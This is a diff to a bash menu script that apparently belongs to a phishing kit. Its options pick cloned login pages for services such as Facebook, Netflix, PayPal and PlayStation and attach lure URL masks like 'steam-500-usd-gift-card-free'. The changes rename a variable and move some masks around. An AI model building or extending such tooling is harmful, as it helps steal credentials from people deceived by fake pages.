@@ -78,32 +78,30 @@ server="snapchat"
 start
 
 elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
-website="Twitter"
+server="Twitter"
 mask='unlimited-onedrive-space-for free'
 start
 
 elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
-website="github"
-mask='upgrade-your-netflix-plan-free'
+server="github"
 start
 
 elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
-website="Google"
+server="Google"
 Google
 
 elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
-website="Spotfy"
+server="Spotfy"
 mask='steam-500-usd-gift-card-free'
 start
 
 elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
-website="Netflix"
+server="Netflix"
 mask='get-blue-badge-on-twitter-free'
 start
 
 elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
-website="Paypal"
-mask='playstation-500-usd-gift-card-free'
+server="Paypal"
 start
 
 elif [[ $menu_option == 10 ]]; then
@@ -247,6 +245,7 @@ start
 
 elif [[ $menu_option == 45 ]]; then
 server="playstation"
+mask='playstation-500-usd-gift-card-free'
 start
 
 elif [[ $menu_option == 46 ]]; then
@@ -341,19 +340,19 @@ printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
-website="face_desk"
+server="face_desk"
 start
 
 elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
-website="face_deskStat"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
-website="face_mobSec"
+server="face_mobSec"
 start
 
 elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
-website="face_moobileP"
+server="face_moobileP"
 start
 
 else
@@ -375,15 +374,15 @@ printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option
 
 if [[ $fb_option == 1 || $lol_option == 01 ]]; then
-website="lol"
+server="lol"
 start
 
 elif [[ $fb_option == 2 || $lol_option == 02 ]]; then
-website="createLOL"
+server="createLOL"
 start
 
 elif [[ $fb_option == 3 || $lol_option == 03 ]]; then
-website="lol"
+server="lol"
 start
 
 else
